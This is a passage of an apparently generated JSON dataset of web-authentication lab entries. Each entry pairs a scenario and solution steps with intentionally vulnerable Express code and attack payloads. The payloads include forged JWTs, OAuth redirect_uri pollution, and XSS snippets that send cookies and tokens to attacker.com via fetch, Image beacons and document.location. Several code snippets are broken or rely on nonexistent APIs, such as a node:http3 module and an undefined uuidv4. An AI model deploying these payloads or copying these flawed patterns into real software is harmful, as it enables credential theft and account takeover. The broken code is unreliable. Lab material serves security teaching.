      "Capture a valid JWT token using Burp Suite",
      "Decode the token structure using jwt.io",
      "Modify the signature to include null bytes",
      "Submit the malformed token to authentication endpoints",
      "Observe successful authentication bypass"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.post('/admin', (req, res) => {try {jwt.verify(req.body.token, 'secret', {algorithms:['HS256']});res.send('Admin access');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.00000000",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.AAAAAAAA"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebSocket subprotocol negotiation",
    "Lab Description": "The OAuth implementation leaks tokens during WebSocket subprotocol handshake. The application [includes sensitive tokens in Sec-WebSocket-Protocol headers]. To solve: Intercept WebSocket connections and extract tokens from handshake headers.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify WebSocket endpoints using OWASP ZAP",
      "Analyze WebSocket handshake requests",
      "Capture tokens from Sec-WebSocket-Protocol headers",
      "Reuse tokens in REST API requests",
      "Access privileged endpoints with stolen tokens"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const WebSocket = require('ws');const app = express();const wss = new WebSocket.Server({server: app.listen(3000)});wss.on('connection', (ws, req) => {const token = req.headers['sec-websocket-protocol'];ws.send('Authenticated');});",
    "payloads": [
      "Sec-WebSocket-Protocol: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
      "GET /chat HTTP/1.1\r\nHost: victim.com\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Protocol: bearer malicious_token\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/3 connection migration",
    "Lab Description": "The HTTP/3 implementation assigns session tokens based on QUIC connection IDs. The application [reuses session state across migrated connections]. To solve: Fixate session by forcing connection migration before authentication.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify HTTP/3 support using Chrome DevTools",
      "Capture initial connection handshake",
      "Trigger connection migration by changing networks",
      "Authenticate during migrated connection",
      "Reuse session from original connection"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http3 = require('node:http3');const app = http3.createServer((req, res) => {if(!req.session) req.session = uuidv4();res.end('Connected');});app.listen(3000);",
    "payloads": [
      "GET / HTTP/3\r\nHost: victim.com\r\nConnection-ID: fixed123\r\n\r\n",
      "POST /login HTTP/3\r\nHost: victim.com\r\nConnection-ID: fixed123\r\n\r\nusername=admin&password=admin"
    ]
  },
  {
    "Lab scenario": "MFA bypass via WebAuthn replay attack",
    "Lab Description": "The WebAuthn implementation fails to validate challenge nonces properly. The application [accepts reused authentication assertions]. To solve: Capture valid WebAuthn assertion and replay it to bypass MFA.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebAuthn authentication flow using Burp Suite",
      "Capture valid authentication assertion",
      "Modify assertion timestamp and counter",
      "Replay assertion to authentication endpoint",
      "Observe successful MFA bypass"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/webauthn/verify', (req, res) => {if(validateAssertion(req.body.assertion)) res.send('Verified');else res.status(403).send('Invalid');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"assertion\":{\"authenticatorData\":\"...\",\"clientDataJSON\":\"...\",\"signature\":\"...\"}}",
      "{\"assertion\":{\"authenticatorData\":\"malicious\",\"clientDataJSON\":\"data\",\"signature\":\"fake\"}}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via case-sensitive cookie parsing",
    "Lab Description": "The authentication system processes cookies with case-sensitive inconsistencies. The application [treats 'Session' and 'session' as different cookies]. To solve: Perform credential stuffing with case-varied cookie names to bypass authentication.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify authentication cookie using OWASP ZAP",
      "Test cookie name case sensitivity",
      "Load credential lists into Burp Intruder",
      "Configure payload processing for case variations",
      "Identify successful authentications"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/admin', (req, res) => {if(req.cookies.Session === 'valid') res.send('Admin panel');else res.status(403).send('Forbidden');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "Cookie: Session=valid",
      "Cookie: session=valid"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via key ID confusion",
    "Lab Description": "The JWT implementation incorrectly processes key IDs from untrusted sources. The application [uses kid header to select verification keys without proper validation]. To solve: Inject malicious kid header pointing to attacker-controlled key to forge valid tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite",
      "Identify kid header in token structure",
      "Set up attacker-controlled JWKS endpoint",
      "Modify kid header to reference malicious key",
      "Sign token with attacker's private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;const key = getKeyFromKid(token.header.kid);jwt.verify(token, key);res.send('Admin access');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImF0dGFja2VyLWNvbnRyb2xsZWQta2V5In0.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Im1hbGljaW91cy1rZXkifQ.eyJyb2xlIjoiYWRtaW4ifQ.7Z6Jz5Q4hX9y8Uv2w3T1x0R7v6N9m8B7v6N9m8B7v6N9m8B"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via iframe CSP bypass",
    "Lab Description": "The OAuth token endpoint is embedded in iframes with overly permissive CSP headers. The application [leaks tokens through postMessage events]. To solve: Craft malicious page that extracts tokens via iframe CSP bypass.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth iframe endpoints using OWASP ZAP",
      "Analyze CSP headers for unsafe-eval or unsafe-inline directives",
      "Create malicious page embedding target iframe",
      "Inject JavaScript to intercept postMessage events",
      "Extract OAuth tokens from message data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/iframe', (req, res) => {res.set('Content-Security-Policy', \"default-src 'self' 'unsafe-inline'\");res.send(`<script>parent.postMessage({token:'secret123'},'*')</script>`);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<iframe src=\"https://victim.com/oauth/iframe\" onload=\"window.addEventListener('message',e=>document.location='http://attacker.com/?token='+e.data.token)\"></iframe>",
      "<script>var iframe=document.createElement('iframe');iframe.src='https://victim.com/oauth/iframe';document.body.appendChild(iframe);window.addEventListener('message',e=>fetch('http://attacker.com',{method:'POST',body:e.data.token}));</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 stream prioritization",
    "Lab Description": "The HTTP/2 implementation assigns sessions based on stream dependencies. The application [reuses session state across dependent streams]. To solve: Craft HTTP/2 requests with malicious stream dependencies to fixate sessions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify HTTP/2 support using Chrome DevTools",
      "Capture initial connection handshake",
      "Construct requests with malicious stream dependencies",
      "Fixate session cookie in parent stream",
      "Force victim to authenticate in dependent stream"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');const fs = require('fs');const server = http2.createSecureServer({cert:fs.readFileSync('server.crt'),key:fs.readFileSync('server.key')});server.on('stream', (stream, headers) => {if(headers[':path'] === '/login') stream.session = uuidv4();});server.listen(3000);",
    "payloads": [
      "GET / HTTP/2\r\nHost: victim.com\r\n\r\n",
      "POST /login HTTP/2\r\nHost: victim.com\r\nStream-Dependency: 1\r\n\r\nusername=admin&password=admin"
    ]
  },
  {
    "Lab scenario": "MFA bypass via TOTP prediction",
    "Lab Description": "The TOTP implementation uses insufficient entropy in seed generation. The application [generates predictable OTP sequences]. To solve: Capture multiple OTPs and reverse-engineer the generation algorithm to predict valid codes.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Enroll multiple test accounts and collect their TOTP seeds",
      "Analyze seed patterns using Python scripts",
      "Reverse-engineer seed generation formula",
      "Calculate victim's likely seed based on username",
      "Generate valid TOTP codes using predicted seed"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const speakeasy = require('speakeasy');const app = express();app.post('/mfa/enroll', (req, res) => {const seed = Buffer.from(req.body.username).toString('hex').slice(0,10);const otp = speakeasy.generateSecret({seed});res.json(otp);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"username\":\"carlos\",\"code\":\"123456\"}",
      "{\"username\":\"admin\",\"code\":\"654321\"}"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via header parameter injection",
    "Lab Description": "The JWT implementation fails to properly sanitize header parameters before verification. The application [processes malicious x5u header values as valid certificate URLs]. To solve: Inject x5u header pointing to attacker-controlled certificate to bypass signature validation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite",
      "Add x5u header with URL to malicious certificate",
      "Host crafted X.509 certificate on attacker server",
      "Sign token with certificate's private key",
      "Submit forged token to authentication endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.post('/verify', (req, res) => {const options = {algorithms: ['RS256'],complete: true};const decoded = jwt.verify(req.body.token, null, options);res.send('Valid');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL21hbGljaW91cy5jZXIifQ.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vZXZpbC5jb20vZmFrZS5jZXIifQ.eyJyb2xlIjoiYWRtaW4ifQ.7Z6Jz5Q4hX9y8Uv2w3T1x0R7v6N9m8B7v6N9m8B7v6N9m8B"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via DNS prefetch",
    "Lab Description": "The OAuth implementation includes tokens in external resource URLs that trigger DNS prefetching. The application [leaks tokens through DNS lookups]. To solve: Craft malicious page with resource links containing tokens to capture them via DNS exfiltration.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Identify token leakage in resource URLs",
      "Set up DNS logging server",
      "Create page with prefetch links containing tokens",
      "Capture tokens from DNS queries"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const token = req.query.access_token;res.send(`<link rel=\"dns-prefetch\" href=\"//${token}.attacker.com\">`);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<link rel=\"dns-prefetch\" href=\"//eyJhbGciOi.attacker.com\">",
      "<link rel=\"preconnect\" href=\"//token-leak.attacker.com/?t=eyJhbGciOi\">"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebTransport session IDs",
    "Lab Description": "The WebTransport implementation assigns session tokens before authentication. The application [uses connection IDs as session tokens]. To solve: Establish WebTransport connection, fixate session ID, and force victim to authenticate over same connection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebTransport connection using Chrome DevTools",
      "Note session ID in initial handshake",
      "Create malicious page that forces victim authentication",
      "Monitor data streams for victim's session",
      "Hijack authenticated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');const wt = new WebTransport('https://localhost:3000');wt.ready.then(() => {wt.session = uuidv4();});",
    "payloads": [
      "CONNECT / HTTP/3\r\nHost: victim.com\r\nSec-WebTransport-Protocol: session-fixation\r\n\r\n",
      "GET /auth HTTP/3\r\nHost: victim.com\r\nSession-ID: malicious123\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter tampering",
    "Lab Description": "The MFA verification relies on client-supplied state parameters. The application [trusts state parameters without server-side validation]. To solve: Modify state parameter to bypass verification after initial MFA challenge.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept MFA initiation request with Burp Suite",
      "Capture state parameter value",
      "Submit invalid verification code",
      "Modify state parameter in final verification request",
      "Observe successful authentication bypass"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/mfa/verify', (req, res) => {if(req.body.state === 'verified') res.send('Success');else res.status(403).send('Failed');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"code\":\"111111\",\"state\":\"pending\"}",
      "{\"code\":\"111111\",\"state\":\"verified\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via HTTP/3 connection reuse",
    "Lab Description": "The authentication system reuses HTTP/3 connections for multiple requests. The application [maintains session state across requests on same connection]. To solve: Perform credential stuffing by reusing established connections to bypass rate limits.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify HTTP/3 support using Chrome DevTools",
      "Establish persistent connection to target",
      "Load credential lists into Burp Intruder",
      "Configure Intruder to reuse HTTP/3 connection",
      "Execute high-volume credential stuffing attack"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http3 = require('node:http3');const server = http3.createServer((req, res) => {if(!req.connection.session) req.connection.session = uuidv4();res.end('Connected');});server.listen(3000);",
    "payloads": [
      "POST /login HTTP/3\r\nHost: victim.com\r\nConnection: keep-alive\r\n\r\nusername=admin&password=admin",
      "POST /login HTTP/3\r\nHost: victim.com\r\nConnection: reuse\r\n\r\nusername=user&password=password"
    ]
  },
  {
    "Lab scenario": "JWT algorithm switching vulnerability in REST API",
    "Lab Description": "The lab's authentication system uses JWTs with flawed algorithm validation. The application accepts unsigned tokens when the algorithm is switched to 'none'. To solve: forge a valid JWT for the admin user by exploiting algorithm confusion.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept login request with Burp Suite to capture a valid JWT",
      "Decode the JWT using jwt.io to analyze structure and claims",
      "Modify the algorithm header to 'none' and remove the signature",
      "Change the 'sub' claim to 'admin' and 'role' to 'administrator'",
      "Submit the modified token in Authorization header to access admin panel"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization.split(' ')[1];const decoded = jwt.verify(token, null, { algorithms: ['HS256', 'none'] });if (decoded.role === 'administrator') return res.send('Admin panel');res.status(403).send('Forbidden');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIn0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ",
      "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicHJpdmlsZWdlIjoiYWRtaW4ifQ"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via referer header in SPA",
    "Lab Description": "The OAuth implementation leaks authorization codes through referer headers when loading external resources. The application doesn't validate the redirect_uri properly. To solve: steal an OAuth token by intercepting the referer header and gain access to the victim's data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept OAuth flow initiation",
      "Inject malicious JavaScript that loads an attacker-controlled image",
      "Capture the authorization code from referer header in server logs",
      "Exchange the stolen code for an access token at the token endpoint",
      "Use the token to query the userinfo endpoint for sensitive data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const code = req.query.code;if(code) return res.send('<script>new Image().src=\"https://attacker.com/steal?ref=\"+encodeURIComponent(document.referrer)</script>');res.send('Invalid code');});app.get('/userinfo', (req, res) => {if(req.headers.authorization === 'Bearer valid-token') return res.json({email: 'admin@vuln.com'});res.status(401).send('Unauthorized');});app.listen(3000);",
    "payloads": [
      "<img src=x onerror=this.src='http://attacker.com/?leak='+encodeURIComponent(document.referrer)>",
      "<script>fetch('http://attacker.com/collect?data='+btoa(document.cookie))</script>",
      "<link rel=\"stylesheet\" href=\"http://attacker.com/?stolen=\"+document.location.href>"
    ]
  },
  {
    "Lab scenario": "GraphQL batching attack on auth mutation",
    "Lab Description": "The GraphQL endpoint processes authentication mutations in batches without rate limiting. The application fails to track login attempts across batched requests. To solve: perform a credential stuffing attack by sending 1000 password guesses in a single GraphQL batch request.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture login mutation with Postman to analyze GraphQL schema",
      "Create a batch request with 1000 login attempts using common passwords",
      "Use Burp Intruder to automate the attack with different username/password combinations",
      "Identify successful login by searching for 200 OK responses with valid session cookies",
      "Extract session cookie and access protected resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer, gql } = require('apollo-server-express');const typeDefs = gql`type Mutation {login(username: String!, password: String!): AuthPayload}`;const resolvers = {Mutation: {login: (_, args) => {if(args.password === 'correct') return {token: 'valid'};throw new Error('Invalid');}}};const server = new ApolloServer({ typeDefs, resolvers });server.applyMiddleware({ app });app.listen(4000);",
    "payloads": [
      "[{\"query\":\"mutation($input:LoginInput!){login(input:$input){token}}\",\"variables\":{\"input\":{\"username\":\"admin\",\"password\":\"password1\"}}}]",
      "{\"query\":\"mutation{login1:login(username:\\\"admin\\\",password:\\\"123456\\\"){token} login2:login(username:\\\"admin\\\",password:\\\"qwerty\\\"){token}}\"}",
      "{\"query\":\"mutation($pass:String!){login(username:\\\"admin\\\",password:$pass){token}}\",\"variables\":{\"pass\":\"admin123\"}}"
    ]
  },
  {
    "Lab scenario": "Session fixation via pre-authenticated JWT in SOAP API",
    "Lab Description": "The SOAP-based authentication service issues JWTs before email verification is complete. The application doesn't invalidate pre-verification tokens after verification. To solve: fixate a session by obtaining a pre-verification token, completing verification, then using the original token to access the account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept account registration request with Burp Suite",
      "Extract the JWT from the response before email verification",
      "Complete the email verification process in a separate session",
      "Reuse the original JWT to bypass authentication checks",
      "Access privileged endpoints with the pre-verification token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.post('/register', (req, res) => {const token = jwt.sign({email: req.body.email, verified: false}, 'secret', {expiresIn: '1h'});res.send(token);});app.post('/verify-email', (req, res) => {const token = req.body.token;jwt.verify(token, 'secret', (err, decoded) => {if(err) return res.status(400).send('Invalid');decoded.verified = true;res.send(jwt.sign(decoded, 'secret'));});});app.get('/account', (req, res) => {const token = req.headers.authorization;jwt.verify(token, 'secret', (err, decoded) => {if(!err && decoded.email) return res.send('Account data');res.status(401).send('Unauthorized');});});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGV4YW1wbGUuY29tIiwidmVyaWZpZWQiOmZhbHNlLCJpYXQiOjE2NTQyMzQ1NjB9.9QJhZvLqzVj5v5X5d5X5d5X5d5X5d5X5d5X5d5X5d5X",
      "<soap:Envelope><soap:Header><wsse:Security><wsse:UsernameToken><wsse:Username>admin</wsse:Username><wsse:Password>pre-verified-token</wsse:Password></wsse:UsernameToken></wsse:Security></soap:Header></soap:Envelope>",
      "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGV4YW1wbGUuY29tIiwidmVyaWZpZWQiOmZhbHNlLCJpYXQiOjE2NTQyMzQ1NjB9.9QJhZvLqzVj5v5X5d5X5d5X5d5X5d5X5d5X5d5X5d5X\"}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via status parameter manipulation",
    "Lab Description": "The multi-factor authentication flow can be bypassed by manipulating the status parameter in the verification request. The application fails to validate the MFA completion state server-side. To solve: intercept the MFA verification process and modify the status parameter to 'verified' before the code is validated.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Log in with valid credentials using Burp Suite",
      "Intercept the MFA initiation request and note the session token",
      "Forward the request but don't submit the verification code",
      "Manually craft a request to /verify-mfa with status=verified",
      "Access protected resources with the bypassed session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use(express.json());let sessions = {};app.post('/verify-mfa', (req, res) => {const { sessionId, code, status } = req.body;if(status === 'verified' || (sessions[sessionId] && sessions[sessionId] === code)) {return res.send({ token: 'valid-token' });}res.status(403).send('Invalid MFA');});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"123\",\"status\":\"verified\"}",
      "sessionId=123&status=verified",
      "<request><sessionId>123</sessionId><status>verified</status></request>"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice authentication",
    "Lab Description": "The JWT validation service vulnerable to key path traversal via kid header. The application loads verification keys from filesystem without sanitization. To solve: forge admin token by forcing system to use public key from predictable location.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite and analyze kid header",
      "Modify kid to point to /etc/passwd and observe error leakage",
      "Craft kid header targeting /dev/null to trigger key load failure",
      "Switch to known public key location like /var/www/public.key",
      "Sign modified token with attacker-generated key matching public key"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const fs = require('fs');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, (header, callback) => {fs.readFile('/keys/'+header.kid, (err, key) => {callback(null, key);});});if(decoded.role === 'admin') res.send('Admin access');} catch(e) {res.status(500).send(e.message);}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImtpZCI6Ii92YXIvd3d3L3B1YmxpYy5rZXkifQ.eyJyb2xlIjoiYWRtaW4ifQ.real-signature",
      "eyJhbGciOiJSUzI1NiIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature"
    ]
  },
  {
    "Lab scenario": "OAuth state parameter CSRF in social login flow",
    "Lab Description": "The OAuth implementation fails to validate state parameter in callback handler. The application accepts any state value after initial redirect. To solve: craft malicious link that authenticates victim to attacker's account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow with OWASP ZAP to identify state parameter",
      "Capture valid authentication request and remove state parameter",
      "Observe system still completes authentication without state",
      "Construct phishing URL with attacker-controlled state value",
      "Lure victim to click link while attacker maintains session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const code = req.query.code;const state = req.query.state || 'default';req.session.state = state;res.redirect('/profile?state='+state);});app.get('/profile', (req, res) => {if(req.query.state === req.session.state) res.send('Profile data');else res.send('Invalid state');});app.listen(3000);",
    "payloads": [
      "https://victim.com/oauth/callback?code=123&state=attacker_value",
      "<iframe src=\"https://victim.com/oauth/authorize?response_type=code&client_id=client&state=attacker_value\">",
      "javascript:fetch('https://victim.com/oauth/callback?code=stolen&state=attacker_value')"
    ]
  },
  {
    "Lab scenario": "Session fixation via JSONP callback parameter",
    "Lab Description": "The JSONP endpoint leaks session tokens through callback parameter reflection. The application embeds sensitive data in JavaScript responses. To solve: fixate victim's session by crafting malicious JSONP request.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Discover JSONP endpoint using Burp Suite scanner",
      "Analyze response containing session token in callback",
      "Craft HTML page with malicious callback function",
      "Induce victim to visit page which steals their session",
      "Use captured token to impersonate victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/userinfo', (req, res) => {const callback = req.query.callback || 'callback';res.set('Content-Type', 'application/javascript');res.send(callback+'({token: \"'+req.session.token+'\"});');});app.listen(3000);",
    "payloads": [
      "<script src=\"https://victim.com/userinfo?callback=stealToken\"></script>",
      "function stealToken(data){document.location='https://attacker.com/?token='+data.token;}",
      "<script>function exfil(data){new Image().src='http://attacker.com/'+data.token;}</script><script src='https://victim.com/userinfo?callback=exfil'></script>"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via X-Forwarded-Host",
    "Lab Description": "The password reset functionality trusts X-Forwarded-Host header for link generation. The application doesn't validate host headers against allowed domains. To solve: poison reset link to point to attacker server and capture token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp Suite",
      "Add X-Forwarded-Host: attacker.com header",
      "Submit request and observe poisoned reset link",
      "Wait for victim to click link and capture token",
      "Use token to reset victim's password"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset', (req, res) => {const host = req.headers['x-forwarded-host'] || req.headers.host;const token = generateToken();res.send('Reset link: https://'+host+'/reset?token='+token);});app.listen(3000);",
    "payloads": [
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Forwarded-Host: attacker.com",
      "GET /reset?token=stolen-token HTTP/1.1",
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Forwarded-Host: attacker.com"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header injection",
    "Lab Scenario": "The JWT validation accepts arbitrary jku headers pointing to external keys. The application doesn't restrict key server locations. To solve: host malicious public key and forge valid token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT and note jku header support",
      "Generate RSA key pair using OpenSSL",
      "Host public key on attacker-controlled server",
      "Craft token with jku pointing to malicious key",
      "Sign token with private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;const decoded = jwt.verify(token, {complete: true}, {algorithms: ['RS256']});fetch(decoded.header.jku).then(key => {jwt.verify(token, key);});});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2tleS5qc29uIn0.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9tYWxpY2lvdXMua2V5In0.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImpydSI6Imh0dHBzOi8vZXZpbC5jb20va2V5In0.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "JWT x5u header SSRF in banking API",
    "Lab Description": "The JWT validation vulnerable to SSRF via x5u header fetching external certificates. The application processes x5u URLs without proper validation. To solve: forge admin token by forcing server to fetch verification certificate from attacker-controlled domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite and analyze x5u header support",
      "Set up malicious HTTPS server with self-signed certificate",
      "Craft JWT with x5u pointing to attacker server",
      "Capture outgoing request from validation server",
      "Sign token with matching private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const https = require('https');const app = express();app.get('/transfer', (req, res) => {const token = req.headers.authorization;jwt.verify(token, {complete:true}, (err, decoded) => {if(err) return res.status(403).send('Invalid token');if(decoded.header.x5u) {https.get(decoded.header.x5u, cert => {jwt.verify(token, cert, {algorithms:['RS256']});});}if(decoded.payload.role==='admin') res.send('Transfer approved');});});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2NlcnQucGVtIn0.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9tYWxpY2lvdXMucGVtIn0.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHBzOi8vZXZpbC5jb20vY2VydCJ9.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping via parameter pollution",
    "Lab Description": "The OAuth token endpoint vulnerable to parameter pollution in redirect_uri. The application processes multiple redirect_uri parameters inconsistently. To solve: steal authorization code by injecting secondary redirect_uri pointing to attacker server.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow with OWASP ZAP to identify redirect_uri usage",
      "Intercept authorization request and duplicate redirect_uri parameter",
      "Set first redirect_uri to legitimate value and second to attacker domain",
      "Capture authorization code sent to malicious endpoint",
      "Exchange code for access token at legitimate token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/authorize', (req, res) => {const uris = Array.isArray(req.query.redirect_uri) ? req.query.redirect_uri : [req.query.redirect_uri];res.redirect(uris[0]+'?code=123');});app.listen(3000);",
    "payloads": [
      "/oauth/authorize?client_id=legit&redirect_uri=https://client.com&redirect_uri=https://attacker.com",
      "/oauth/authorize?client_id=legit&redirect_uri[]=https://client.com&redirect_uri[]=https://attacker.com",
      "/oauth/authorize?client_id=legit&redirect_uri=https%3A%2F%2Fclient.com&redirect_uri=https%3A%2F%2Fattacker.com"
    ]
